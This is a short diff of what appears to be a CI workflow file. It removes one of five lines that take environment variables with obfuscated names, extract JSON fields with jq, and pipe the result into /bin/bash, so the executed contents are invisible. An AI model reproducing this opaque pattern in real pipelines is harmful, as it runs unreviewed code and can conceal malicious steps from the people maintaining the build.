@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$zdcqd0" | jq -r .fza571 | /bin/bash
           echo $dhqxt32 | jq -r .o6786 | /bin/bash
-          printf '%s' "$ufxz2" | jq -r .yqmqt165 | /bin/bash
           printf '%s' "$kqr3" | jq -r .ng485 | /bin/bash
           echo $ip89 | jq -r .b61 | /bin/bash
 
